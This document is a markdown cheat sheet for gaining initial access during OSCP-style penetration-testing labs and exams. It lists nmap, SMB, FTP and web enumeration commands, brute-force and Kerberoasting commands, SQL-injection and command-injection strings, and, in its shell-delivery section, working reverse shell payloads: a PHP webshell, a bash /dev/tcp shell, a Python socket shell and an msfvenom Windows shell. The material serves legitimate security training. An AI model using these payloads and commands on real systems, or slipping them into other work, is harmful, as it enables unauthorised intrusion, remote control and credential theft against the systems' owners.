# 🚪 InitialFoothold.md - Initial Access & Foothold Cheat Sheet (OSCP)

This cheat sheet covers discovery, enumeration, and exploitation methods used to gain your first shell on a target system — aka the "foothold." Use it for OSCP labs, PG, HTB, and exam boxes.

---

## 🧭 1. Pre-Engagement / Scanning

### 🔹 Nmap Recon
```bash
nmap -sS -sV -sC -Pn -T4 -oN basic.txt <IP>
nmap -p- --min-rate 1000 -T4 -oN full.txt <IP>
nmap -sU -p- -T4 -oN udp.txt <IP>
```

### 🔹 Nmap Nse Recon
```bash
nmap -Pn -sC -sV --script=vuln*.nse -p22 <victim_ip> -T5 -A #Change 22 to the port you want to check
```

### 🔹 Most common ports for oscp machines
#### FTP 21:
```bash
# anonymous login check:
ftp <victim_ip>
username: anonymous
pwd: anonymous
# if successful login then --> file upload --> use the command put shell.php
```

#### SSH 22:
```bash
# id_rsa.pub: Public key thatcan be used in authorized_keys for login
# id_rsa: Private key that is used for login. Might ask for password. can be cracked with ssh2john and john:
ssh -i id_rsa username@10.10.10.X
# For login without password add id_rsa.pub to authorized_keys
```

#### SMB 139,445:
```bash
#With No Creds
    nbtscan {IP}
    smbmap -H {IP}
    smbmap -H {IP} -u null -p null
    smbmap -H {IP} -u guest
    smbclient -N -L //{IP}
    smbclient -N //{IP}/ --option="client min protocol"=LANMAN1
    rpcclient {IP}
    rpcclient -U "" {IP}
    crackmapexec smb {IP}
    crackmapexec smb {IP} --pass-pol -u "" -p ""
    crackmapexec smb {IP} --pass-pol -u "guest" -p ""
    GetADUsers.py -dc-ip {IP} "{Domain_Name}/" -all
    GetNPUsers.py -dc-ip {IP} -request "{Domain_Name}/" -format hashcat
    GetUserSPNs.py -dc-ip {IP} -request "{Domain_Name}/"
    getArch.py -target {IP}

# With Creds
    smbmap -H {IP} -u {Username} -p {Password}
    smbclient "\\\\{IP}\\\" -U {Username} -W {Domain_Name} -l {IP}
    smbclient "\\\\{IP}\\\" -U {Username} -W {Domain_Name} -l {IP} --pw-nt-hash `hash`
    crackmapexec smb {IP} -u {Username} -p {Password} --shares
    GetADUsers.py {Domain_Name}/{Username}:{Password} -all
    GetNPUsers.py {Domain_Name}/{Username}:{Password} -request -format hashcat
    GetUserSPNs.py {Domain_Name}/{Username}:{Password} -request

# After commands
    enum4linux -a {IP}
    nmap --script 'smb-vuln*' -Pn -p 139,445 {IP}
    # Brute Force
    hydra -t 1 -V -f -l {Username} -P {Big_Passwordlist} {IP} smb
    msfconsole -q -x 'use auxiliary/scanner/smb/smb_version; set RHOSTS {IP}; set RPORT 139; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smb/smb2; set RHOSTS {IP}; set RPORT 139; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smb/smb_version; set RHOSTS {IP}; set RPORT 445; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smb/smb2; set RHOSTS {IP}; set RPORT 445; run; exit'
```


### 🔹 Quick Web Recon
```bash
whatweb http://<IP>
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt -t 50
nikto -h http://<IP>
```

---

## 🕸 2. Web-Based Attack Vectors

### 🔹 Common File Paths
```
/robots.txt
/.git/
/backup/
/admin/
/phpinfo.php
.htaccess
.htpasswd

```

### 🔹 Vulnerability Types
- **LFI/RFI** → Try `/etc/passwd`, PHP wrappers
- **Command Injection** → `; whoami`, `| id`, `&& whoami`
- **File Upload** → Upload `.php`, `.php5`, bypass filters
- **SQLi** → `' OR 1=1 --`, use `sqlmap` if needed
- **XSS (less common for OSCP but can lead to admin panel takeover)**

---

## 🛠 3. Credential Hunting

### 🔹 Config/Backup Files
```bash
cat config.php
cat db.php
cat backup.sql
```

### 🔹 Hardcoded Creds / .git Dorks
```bash
git clone http://<IP>/.git
cd repo && git log && git show <commit>
```

### 🔹 HTTP Basic Auth
```bash
curl -u admin:admin http://<IP>/protected
```

---

## 🧬 4. Exploit Development & Shell Delivery

### 🔹 Manual Exploit
Check:
- CVE from `searchsploit`
- Exploit parameters
- Remote vs Local

```bash
searchsploit apache 2.4.49
```

### 🔹 Reverse Shell Payloads
```bash
# PHP
<?php system($_GET['cmd']); ?>
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'"); ?>

# Python
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'

# msfvenom (Windows)
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f exe -o shell.exe
```

### 🔹 Web Shells
- `cmd.php`, `backdoor.aspx`, `nc.aspx`
- Use `weevely`, `webshells from PayloadsAllTheThings`

---

## 🧰 5. Exploit Tools
- `msfconsole`
- `exploit-db`
- `nuclei`
- `ffuf`, `gobuster`
- `wpscan`, `joomscan`, `drupwn` for CMS

---

## 🔄 6. Post-Shell Checks (Confirm Foothold)
```bash
whoami
hostname
ip a / ipconfig
uname -a / systeminfo
```


Keep this cheat sheet offline and ready. A fast, solid foothold is half the battle in OSCP.
